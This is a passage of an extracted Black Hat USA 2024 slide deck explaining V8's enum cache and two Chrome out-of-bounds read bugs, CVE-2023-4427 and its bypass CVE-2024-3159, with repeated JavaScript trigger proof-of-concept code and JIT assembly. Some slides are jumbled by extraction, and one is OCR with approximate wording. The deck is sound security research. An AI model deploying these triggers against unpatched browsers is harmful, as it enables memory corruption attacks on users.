---
title: "Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell"
speakers: ["Edouard Bochin", "Tao Yan", "Bo Qu"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Edouard Bochin & Tao Yan & Bo Qu_Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell.pdf"
pages: 102
sha256: "3508ef0d8c1e76a57c51a92576d70c6ce4b9415d069835f8b5558c0fe5dac049"
text_chars: 62665
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 81.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:29:55Z"
---
# Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell

**Speakers:** Edouard Bochin, Tao Yan, Bo Qu  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Edouard Bochin & Tao Yan & Bo Qu_Let the Cache Cache and Let the WebAssembly Assemble Knockin' on Chrome's Shell.pdf` (102 pages)


## Slide 1

Let the Cache Cache and Let the WebAssembly Assemble: Knocking’ on Chrome’s Shell

Edouard Bochin (@le_douds), Tao Yan (@Ga1ois) and Bo Qu Palo Alto Networks

#BHUSA @BlackHatEvents

## Slide 2

### About Us

###### **`Security Researchers`**

- `Offensive Research:`

   - `MSRC Top 10 *times`

   - `100+ CVEs in Browser, Office, Windows, PDF, etc.`

- `Defensive research:`

   - `Threat analysis, detection research`

   - `Patent Inventors: New defense and detection techniques`

###### **`Pwn2Own Winners`**

- `Chrome/MSEdge Double Tap @ Pwn2Own 2024 Vancouver`

- `Windows Escalation of Privilege @ Pwn2Own 2021 Vancouver`

###### **`Conference Speakers`**

- `Black Hat (USA, EU, Asia, MEA)`

- `CanSecWest`

- `Blue Hat`

- `POC`

- `HITCON`

- `Virus Bulletin`

- `REcon`

- `Etc.`

#BHUSA @BlackHatEvents

2

## Slide 3

### Agenda

- `Introduction`

- `Let the Cache Cache`

   - `Tricking V8 engine enum cache`

   - `Exploiting the enum cache vulnerability`

- `Let the WebAssembly Assemble`

   - `The V8 Sandbox and WebAssembly internals`

   - `Escaping the V8 Sandbox with the novel “field confusion” technique`

- `Putting It All Together`

- `Summary & Takeaways`

#BHUSA @BlackHatEvents

3

## Slide 4

### Introduction

###### `Typical` **`V8 exploit chain`** `targeting Google Chrome` **`without V8 Sandbox`**

Renderer
Memory  Arbitrary
Code
V8 Vuln
Corruption Read/Write
Execution
Chrome
Code
Sandbox
Execution
Escape
Outside
/OS Kernel
Chrome
Vuln

#BHUSA @BlackHatEvents

4

## Slide 5

### Introduction

###### `Typical` **`V8 exploit chain`** `targeting Google Chrome` **`with V8 Sandbox`**

\```
Arbitrary
Read/Write
(Inside V8
Sandbox)
\```

\```
V8 Sandbox
Escape
\```

\```
Memory Read/WriteV8 Sandbox
V8 Vuln
Corruption(Inside V8 Escape
Sandbox)
Chrome
Code Exploit
Sandbox Renderer
Execution Primitives
EscapeCode
Outside outside V8
/OS KernelExecution
ChromeSandbox
Vuln
\```

#BHUSA @BlackHatEvents

5

## Slide 6

### Known V8 Sandbox Escape Techniques

- **`Before V8 Sandbox Beta (Chrome M123) all existing sandbox escape techniques relied on raw pointers stored inside the V8 Sandbox.`**

• **`V8 Sandbox Beta release removed all the raw pointers from the Sandbox, killing all the publicly available techniques and their potential variants.`**

###### **`Address Space`**

### V8 Sandbox

Object1
Raw 64bits  pointer
Object2
Raw 64bits  pointer
External
Object

#BHUSA @BlackHatEvents

6

## Slide 7

### Introduction

Introduction
Typical  V8 exploit chain  targeting Google Chrome  with V8 Sandbox
Arbitrary
Memory  Read/Write V8 Sandbox
V8 Vuln
Corruption (Inside V8  Escape
Sandbox)
Chrome
Code  Exploit
Sandbox  Renderer
Execution  Primitives
Escape Code
Outside  outside V8
/OS Kernel Execution
Chrome Sandbox
Vuln

#BHUSA @BlackHatEvents

7

## Slide 8

# Let the Cache Cache: Tricking V8 Engine Enum Cache

#BHUSA @BlackHatEvents

## Slide 9

### The Basics - JavaScript Objects

Object 1
Map
object1 = {};
Properties
1;;
2;; Elements
3;; 1
In-Object
4;; 2
property
5;;
value 3
4
Descriptor Array
Map Map
Enum Cache: Empty Map
“a” idx:0  SMI Type
…
“b” idx:1 SMI
Properties
“c” idx:2 SMI Nof descriptors = 5
Map
Backpointer
“d” idx:3 SMI
length
DescriptorArray
“e” idx:4 SMI
5
Transitions = NULL

const object1 = {};
object1.a = 1;;
object1.b = 2;;
object1.c = 3;;
object1.d = 4;;
object1.e = 5;;

#BHUSA @BlackHatEvents

9

## Slide 10

###### The Basics – Descriptor Array and Transitions

Descriptor Array 0
const object1 = {};
Map
Enum Cache: Empty

Map 0 Object 1
Nof descriptors = 0 Map
Backpointer = NULL Properties
Descriptor Array Elements
Transitions = NULL

#BHUSA @BlackHatEvents

10

## Slide 11

###### The Basics – Descriptor Array and Transitions

Descriptor Array 0 Map 0 Object 1
const object1 = {};
object1.a = 1; Map Nof descriptors = 0 Map
Enum Cache: Empty Backpointer = NULL Properties
Descriptor Array Elements
Transition 1
“a”
Descriptor Array 1
Map Map 1
Enum Cache: Empty Nof descriptors = 1
“a” idx:0 SMI Backpointer
Descriptor Array
Transitions = NULL

#BHUSA @BlackHatEvents

11

## Slide 12

###### The Basics – Descriptor Array and Transitions

\```
constobject1 = {};
object1.a= 1;
constobject2 = {};
object2.a= 1;
object2.b= 1;
\```

Descriptor Array 0 Map 0 Object 1
Map Nof descriptors = 0 Map
Enum Cache: Empty Backpointer = NULL Properties
Descriptor Array Elements
Transition 1
“a”
Descriptor Array 1
Map Map 1 Object 2
Enum Cache: Empty Nof descriptors = 1 Map
“a” idx:0 SMI Backpointer Properties
Descriptor Array Elements
Transition 1
Descriptor Array 2
“b”  1
Map
Enum Cache: Empty Map 2
“a” idx:0 SMI Nof descriptors = 2
“b” Idx:1 SMI Backpointer
Descriptor Array
Transitions = NULL

#BHUSA @BlackHatEvents

12

## Slide 13

###### The Basics – Descriptor Array and Transitions

\```
constobject1 = {};
object1.a= 1;
constobject2 = {};
object2.a= 1;
object2.b= 1;
\```

\```
Descriptor Array 0
Map
Enum Cache: Empty
\```

\```
Descriptor Array 1
Map
Enum Cache: Empty
“a”idx:0SMI
\```

\```
Descriptor Array 2
Map
Enum Cache: Empty
“a”idx:0SMI
“b”Idx:1SMI
\```

\```
Map 0
Nof descriptors = 0
Descriptor Array
Transition
“a”
Map 1
Nof descriptors = 1
Descriptor Array
Transition
“b”
Map 2
Nof descriptors = 2
Descriptor Array
Transitions = NULL
\```

\```
Object 1
Map
Properties
Elements
1
Object 2
Map
Properties
Elements
1
1
\```

#BHUSA @BlackHatEvents

13

## Slide 14

###### The Basics – Descriptor Array and Transitions

\```
constobject1 = {};
object1.a= 1;
constobject2 = {};
object2.a= 1;
object2.b= 1;
constobject3 = {};
object3.a= 1;
object3.b= 1;
object3.c= 1;
\```

\```
Descriptor Array 2
Map
Enum Cache: Empty
“a”idx:0SMI
“b”idx:1SMI
\```

\```
Descriptor Array 3
Map
Enum Cache: Empty
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2SMI
\```

\```
“a”
\```

\```
Map 1
Nof descriptors = 1
Descriptor Array
Transition
“b”
Map 2
Nof descriptors = 2
Descriptor Array
Transition
“c”
Map 3
Nof descriptors = 3
Descriptor Array
Transitions = NULL
\```

\```
Object 1
Map
Properties
Elements
1
\```

\```
Object 2
Map
Properties
Elements
1
1
\```

\```
Object 3
Map
Properties
Elements
\```

\```
1
\```

\```
1
1
\```

#BHUSA @BlackHatEvents

14

## Slide 15

### The Basics – For-in Loop and Enum Cache

“a”
Object 1
const object1 = {}; Map 1 Map
Enum Cache 1
object1.a = 1;
Nof descriptors = 1 Properties
Map
Descriptor Array Elements
const object2 = {};
Keys[2]
Transition 1
object2.a = 1;
Indices[2]
object2.b = 1; “b”
Object 2
Map 2
Map
const object3 = {};
Descriptor Array 3 Nof descriptors = 2
object3.a = 1; Properties
object3.b = 1; Map Descriptor Array Elements
object3.c = 1; Enum Cache Transition 1
“a” idx:0 SMI
“c”  1
for (let key in object2) {
“b” idx:1 SMI
console.log(object2[key]); Map 3
Object 3
“c” idx:2 SMI
}
Nof descriptors = 3
Map
Descriptor Array
Properties
Transitions = NULL
Elements
Builtins_GetKeyedPropertyHandler() 1
1

\```
1
\```

#BHUSA @BlackHatEvents

15

## Slide 16

### The Basics – For-in Loop and Enum Cache

\```
constobject1 = {};
object1.a= 1;
constobject2 = {};
object2.a= 1;
object2.b= 1;
constobject3 = {};
object3.a= 1;
object3.b= 1;
object3.c= 1;
functiontest() {
for(letkey inobject2) {
console.log(object2[key]);
}
}
%PrepareFunctionForOptimization(test);
test();
%OptimizeFunctionOnNextCall(test);
test();
\```

\```
“a”
Object 1
Map 1Map
Enum Cache 1
Nof descriptors = 1Properties
Map
Descriptor ArrayElements
Keys[2]
Transition1
Indices[2]
“b”
Object 2
Map 2
Map
Descriptor Array 3
Nof descriptors = 2
Properties
Map
Descriptor ArrayElements
Enum Cache
Transition
1
“a”idx:0SMI
“c” 1
“b”idx:1SMI
Map 3
Object 3
“c”idx:2SMI
Nof descriptors = 3
Map
Descriptor Array
Properties
Transitions = NULL
Elements
\```

\```
1
\```

\```
1
1
\```

#BHUSA @BlackHatEvents

16

## Slide 17

###### The Basics – For-in Loop and Enum Cache

\```
ReduceJSLoadPropertyWithEnumeratedKey()
\```

#BHUSA @BlackHatEvents

17


> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The Basics - For-in Loop and Enum Cache
ReduceJSLoadPropertywWithEnumeratedKey ( )
55: Branch[Unspecified, None]
55: Branch[Unspecified, None] : (62: Iffrue
/] 68: Branch[Unspecified, None]
=
USA 2024 17
```

## Slide 18

### CVE-2023-4427

- `Discovered by Sergei Glazunov of Google Project Zero`

- `Reported on August 2023`

- `Out-Of-Bounds read in Enum Cache`

- `Our Pwn2Own vulnerability is a variant of CVE-2023-4427`

#BHUSA @BlackHatEvents

18

## Slide 19

### CVE-2023-4427

\```
constobject1 = {}; object1.a= 1;
constobject2 = {}; object2.a= 1;
object2.b= 1;
\```

\```
constobject3 = {}; object3.a= 1;
object3.b= 1; object3.c= 1;
letescape;
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
\```

\```
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
Enum Cache 1
Map
Keys[2]
Indices[2]
\```

\```
Descriptor Array 3
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2SMI
\```

\```
“a”
Map 1
Nof descriptors = 1
Descriptor Array
Transition
“b”
\```

\```
Map 2
Nof descriptors = 2
Descriptor Array
Transition
“c”
Map 3
Nof descriptors = 3
Descriptor Array
Transitions = NULL
\```

\```
Object 1
Map
Properties
Elements
1
\```

\```
Object 2
Map
Properties
Elements
\```

\```
1
\```

\```
1
\```

\```
Object 3
Map
Properties
Elements
\```

\```
1
\```

\```
1
\```

\```
1
\```

#BHUSA @BlackHatEvents

19

## Slide 20

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
\```

\```
letescape;
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
ReduceJSLoadPropertyWithEnumeratedKey()
\```

\```
pushrbp
mov
rbp,rsp
pushrsi
pushrdi
rax
push
subrsp,0x30
mov
QWORD PTR [rbp-0x20],rsi
cmprsp,QWORDPTR [r13-0x60]
…
\```

#BHUSA @BlackHatEvents

20

## Slide 21

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
letescape;
functiontrigger(callback) {
for(letkeyinobject2) {
callback();
escape = object2[key];
}
}
\```

\```
V8::internal::MapUpdater::ConstructNewMap()
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
Index For-in Loop0
});
Indices01OOB memory…
\```

###### **`Object 2`**

\```
Map
Properties
Elements
1
\```

\```
1
\```

\```
Map 2
Nof descriptors = 2
DescriptorArray
Transition
Descriptor Array 3
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2SMI
Enum Cache 1
Map
Keys[2]
Indices[2]
\```

#BHUSA @BlackHatEvents

21

## Slide 22

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
letescape;
V8::internal::MapUpdater::ConstructNewMap()
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
Index For-in Loop0
});
\```

###### **`Object 2`**

\```
Map
Properties
Elements
1
1
\```

\```
Map 2
Nof descriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache: Empty
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
\```

\```
Map2 updated with
Descriptor Array 4
because of the Map
and Descriptor Array
update of Object3
\```

#BHUSA @BlackHatEvents

22

## Slide 23

\```
// Object 1,2 and 3 Setup
\```

\```
letescape;
\```

### CVE-2023-4427

###### **`Object 2`**

\```
Map
\```

\```
Properties
Elements
\```

\```
1
\```

\```
1
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
Index For-in Loop0
Indices0OOB memory…
\```

\```
Map 2
\```

\```
Nof descriptors = 2
DescriptorArray
Transition
\```

\```
Descriptor Array 4
Map
Enum Cache
\```

\```
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
\```

\```
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

23

## Slide 24

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

###### `Access Descriptor array via Map`

\```
…
mov
r9d, dwordptr[r8 + 0x17]
…
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
Index For-in Loop0
Indices0OOB memory…
\```

###### **`Object 2`**

\```
Map
Properties
Elements
1
1
\```

\```
Map 2
Nof descriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

24

## Slide 25

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
\```

\```
letescape;
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
Access Enum cache via
Descriptor array
\```

…
mov r9d, dword ptr [r14 + r9 + 0xb]
…
Index For-in Loop 0

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
Index For-in Loop0
Indices0OOB memory…
\```

###### **`Object 2`**

\```
Map
\```

\```
Properties
Elements
1
1
\```

\```
Map 2
\```

\```
Nof descriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

25

## Slide 26

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
Access Indices array via Enum
cache
…
movr9d, dwordptr[r14 + r9 + 7]
…
Index For-in Loop0
Indices0OOB memory…
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

###### **`Object 2`**

\```
Map
Properties
Elements
1
1
\```

\```
Map 2
Nof descriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

26

## Slide 27

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
\```

\```
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
Get property value index via
indices array
\```

\```
…
mov
r9d, dwordptr[r9 + 0 + 7]
movr11d, r9d
sarr11d, 1
movsxdr12, r11d
…
Index For-in Loop0
Indices0OOB memory…
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

###### **`Object 2`**

\```
Map
\```

\```
Properties
Elements
1
1
\```

\```
Map 2
Nofdescriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

27

## Slide 28

### CVE-2023-4427

CVE-2023-4427 **`Object 2`** `Map Properties // Object 1,2 and 3 Setup Elements 1 let escape; 1 function trigger(callback) { Get property value index via for (let key in object2) {` **`Map 2`** `callback(); indices array Nof descriptors = 2 escape = object2[key]; … } DescriptorArray } mov r9d, dword ptr [rcx + r12*2 + 0xb] Transition … %PrepareFunctionForOptimization(trigger);` **`Descriptor Array 4`** `trigger(_ => _); trigger(_ => _); Map %OptimizeFunctionOnNextCall(trigger); Enum Cache trigger(_ => { “a” idx:0 SMI object3.c = 1.1; “b” idx:1 SMI for (let key in object1){} }); “c” idx:2 Double Indices 0 OOB memory…` **`Enum Cache 2`** `Map Keys[1] Indices[1]`

#BHUSA @BlackHatEvents

28

## Slide 29

### CVE-2023-4427

\```
// Object 1,2 and 3 Setup
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
Get property value index via
indices array
\```

\```
…
mov
r9d, dwordptr[r9 + r11*4 + 7]
movr12d, r9d
sarr12d, 1
movsxdr15, r12d
…
Index For-in Loop1
Indices0OOB memory…
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

###### **`Object 2`**

\```
Map
\```

\```
Properties
Elements
1
1
\```

\```
Map 2
\```

\```
Nofdescriptors = 2
DescriptorArray
Transition
Descriptor Array 4
Map
Enum Cache
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
Enum Cache 2
Map
Keys[1]
Indices[1]
\```

#BHUSA @BlackHatEvents

29

## Slide 30

### CVE-2023-4427

CVE-2023-4427 **`Object 2`** `Map Properties // Object 1,2 and 3 Setup Elements 1 let escape; 1 function trigger(callback) { Get property value index via for (let key in object2) {` **`Map 2`** `callback(); indices array Nof descriptors = 2 escape = object2[key]; … } DescriptorArray } mov r9d, dword ptr [rcx + r15*2 + 0xb] Transition … %PrepareFunctionForOptimization(trigger);` **`Descriptor Array 4`** `trigger(_ => _); trigger(_ => _); Map %OptimizeFunctionOnNextCall(trigger); Enum Cache trigger(_ => { “a” idx:0 SMI object3.c = 1.1; “b” idx:1 SMI for (let key in object1){} }); “c” idx:2 Double Indices 0 OOB memory…` **`Enum Cache 2`** `Map Keys[1] Indices[1]`

#BHUSA @BlackHatEvents

30

## Slide 31

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

### The Patch

\```
Object 2
\```

\```
Map
Properties
\```

\```
Elements
\```

\```
1
\```

\```
1
\```

\```
Map 2
\```

\```
v8::internal::MapUpdater::ConstructNewMap(){
\```

\```
…
\```

\```
// If the old descriptors had an enumcache, make sure the new
ones do too.
\```

\```
Nof descriptors = 2
DescriptorArray
\```

\```
Transition
\```

\```
if(
\```

- `…`

\```
}
\```

\```
old_descriptors_->enum_cache()->keys()->length() >0 &&
new_map->NumberOfEnumerableProperties() > 0
) {
\```

\```
FastKeyAccumulator::InitializeFastPropertyEnumCache(
isolate_, new_map, new_map->NumberOfEnumerableProperties());
}
\```

\```
Descriptor Array 4
\```

\```
Map
Enum Cache
\```

\```
“a”idx:0SMI
“b”idx:1SMI
\```

\```
“c”idx:2Double
\```

\```
Enum Cache 2
\```

\```
Map
Keys[3]
Indices[3]
\```

#BHUSA @BlackHatEvents

31

## Slide 32

### The Bypass - CVE-2024-3159

###### **`CVE-2024-3159`**

\```
constobject4 = {}; object4.a= 1;object4.b= 1; object4.d= 1;
constobject1 = {}; object1.a= 1;
constobject2 = {}; object2.a= 1;object2.b= 1;
constobject3 = {}; object3.a= 1;object3.b= 1; object3.c= 1;
\```

\```
letescape;
\```

###### **`CVE-2023-4427`**

\```
constobject1 = {}; object1.a= 1;
constobject2 = {}; object2.a= 1;object2.b= 1;
constobject3 = {}; object3.a= 1;object3.b= 1; object3.c= 1;
letescape;
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
\```

\```
}
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

- `%PrepareFunctionForOptimization(trigger);`

\```
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
\```

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

#BHUSA @BlackHatEvents

32

## Slide 33

### The Bypass - CVE-2024-3159

\```
constobject1 = {}; object1.a= 1;
constobject2 = {}; object2.a= 1; object2.b= 1;
constobject3 = {}; object3.a= 1; object3.b= 1;
object3.c= 1;
\```

\```
constobject4 = {};
object4.a= 1;
object4.b= 1;
object4.d= 1;
\```

\```
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
\```

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

#BHUSA @BlackHatEvents

33

## Slide 34

### CVE-2024-3159

\```
constobject4 = {}; object4.a= 1; object4.b= 1; object4.d= 1;
constobject1 = {}; object1.a= 1;
constobject2 = {}; object2.a= 1; object2.b= 1;
constobject3 = {}; object3.a= 1; object3.b= 1; object3.c= 1;
letescape;
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

#BHUSA @BlackHatEvents

34

## Slide 35

### CVE-2024-3159

Object 4 Object 1 Object 2
Map Map Map
Properties Properties Properties
Elements Elements Elements
1 1 1
1 1
1 Map 1
Map 2
Nof descriptors=1 “b”
Nof descriptors=2
Map 4 “d” DescriptorArray
DescriptorArray
Nof descriptors=3 Transition
Transition Array
DescriptorArray
Transitions = NULL
Descriptor Array 4 Descriptor Array 3
Map Map
Enum Cache: Empty Enum Cache: Empty
“a” idx:0 SMI “a” idx:0 SMI
“b” idx:1 SMI “b” idx:1 SMI
“d” idx:2 SMI “c” idx:2 SMI

Object 3
Map
Properties
Elements
1
1
1
“c”
Map 3
Nof descriptors=3
DescriptorArray
Transitions = NULL

#BHUSA @BlackHatEvents

35

## Slide 36

### CVE-2024-3159

\```
constobject4 = {}; object4.a= 1; object4.b= 1; object4.d= 1;
\```

\```
constobject1 = {}; object1.a= 1;
\```

\```
constobject2 = {}; object2.a= 1; object2.b= 1;
constobject3 = {}; object3.a= 1; object3.b= 1; object3.c= 1;
letescape;
\```

\```
functiontrigger(callback) {
for(letkey inobject2) {
callback();
escape = object2[key];
}
\```

\```
}
\```

\```
%PrepareFunctionForOptimization(trigger);
trigger(_ => _);
trigger(_ => _);
%OptimizeFunctionOnNextCall(trigger);
\```

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

#BHUSA @BlackHatEvents

36

## Slide 37

### CVE-2024-3159

Object 4 Object 1 Object 2
Map Map Map
Properties Properties Properties
Elements Elements Elements
1 1 1
1 1
1 Map 1
Map 2
Nof descriptors=1 “b”
Nof descriptors=2
Map 4 “d” DescriptorArray
DescriptorArray
Nof descriptors=3 Transition
Transition Array
DescriptorArray
Transitions = NULL
Descriptor Array 4 Descriptor Array 3
Enum Cache 1 Map Map
Map Enum Cache Enum Cache: Empty
Keys[2] “a” idx:0 SMI “a” idx:0 SMI
Indices[2] “b” idx:1 SMI “b” idx:1 SMI
“d” idx:2 SMI “c” idx:2 SMI

Object 3
Map
Properties
Elements
1
1
1
“c”
Map 3
Nof descriptors=3
DescriptorArray
Transitions = NULL

#BHUSA @BlackHatEvents

37

## Slide 38

`Old Object 3ject 3ect 3` CVE-2024-3159 **`Object 3`**

\```
Old Object 3ject 3ect 3
\```

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
v8::internal::MapUpdater::ConstructNewMap(){
\```

\```
…
// If the old descriptors had an enumcache, make sure the new
ones do too.
\```

\```
if(
\```

\```
old_descriptors_->enum_cache()->keys()->length() >0 &&
new_map->NumberOfEnumerableProperties() > 0
) {
FastKeyAccumulator::InitializeFastPropertyEnumCache(
isolate_, new_map, new_map->NumberOfEnumerableProperties());
}
…
}
\```

\```
Map
Properties
Elements
1
1
1
Map 3
Nof descriptors=3
Backpointer
DescriptorArray
Transition = NULL
Descriptor Array 3
Map
Enum Cache: Empty
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2SMI
\```

#BHUSA @BlackHatEvents

38

## Slide 39

### CVE-2024-3159

\```
Object 3
\```

\```
Map
\```

\```
trigger(_ => {
object3.c= 1.1;
for(letkey inobject1){}
});
\```

\```
v8::internal::MapUpdater::ConstructNewMap(){
\```

\```
…
// If the old descriptors had an enumcache, make sure the new
ones do too.
\```

\```
if(
old_descriptors_->enum_cache()->keys()->length() >0 &&
new_map->NumberOfEnumerableProperties() > 0
) {
FastKeyAccumulator::InitializeFastPropertyEnumCache(
isolate_, new_map, new_map->NumberOfEnumerableProperties());
}
…
}
\```

\```
Properties
Elements
1
1
\```

\```
1
\```

\```
Map 5
Nof descriptors=3
Backpointer
DescriptorArray
Transition = NULL
Descriptor Array 5
Map
Enum Cache: Empty
“a”idx:0SMI
“b”idx:1SMI
“c”idx:2Double
\```

#BHUSA @BlackHatEvents

39

## Slide 40

### CVE-2024-3159

Object 4 Object 1 Object 2
Map Map Map
Properties Properties Properties
Elements Elements Elements
1 1 1
1 1
1 Map 1
Map 2
Nof descriptors=1 “b”
Nof descriptors=2
Map 4 “d” DescriptorArray
DescriptorArray
Nof descriptors=3 Transition
Transition Array
DescriptorArray
Transitions = NULL
Descriptor Array 4 Descriptor Array 5
Enum Cache 1 Map Map
Map Enum Cache Enum Cache: Empty
Keys[2] “a” idx:0 SMI “a” idx:0 SMI
Indices[2] “b” idx:1 SMI “b” idx:1 SMI
“d” idx:2 SMI “c” idx:2 Double

Object 3
Map
Properties
Elements
1
1
1
“c”
Map 5
Nof descriptors=3
DescriptorArray
Transitions = NULL

#BHUSA @BlackHatEvents

40

## Slide 41

### CVE-2024-3159

Object 1 Object 2 Object 3
Map Map Map
Properties Properties Properties
Elements Elements Elements
1 1 1
1 1
Map 1 1
Map 2
Nof descriptors=1 “b” “c”
Map 3
Nof descriptors=2
DescriptorArray
Nof descriptors=3
DescriptorArray
Transition
DescriptorArray
Transition Array
Transitions = NULL
Descriptor Array 5
Map
Enum Cache: Empty
“a” idx:0 SMI
“b” idx:1 SMI
“c” idx:2 Double

#BHUSA @BlackHatEvents

41

## Slide 42

### CVE-2024-3159

Object 1 Object 2 Object 3
Map Map Map
Properties Properties Properties
Elements Elements Elements
1 1 1
1 1
Map 1 1
Map 2
Nof descriptors=1 “b” “c”
Map 3
Nof descriptors=2
DescriptorArray
Nof descriptors=3
DescriptorArray
Transition
DescriptorArray
Transition Array
Transitions = NULL
Indices 0 OOB memory…
Descriptor Array 5
Map
trigger(_ => {
Enum Cache
Enum Cache 2
object3.c = 1.1;
for (let key in object1){}  “a” idx:0 SMI
Map
});
“b” idx:1 SMI
Keys[1]
“c” idx:2 Double
Indices[1]

#BHUSA @BlackHatEvents

42

## Slide 43

### CVE-2024-3159

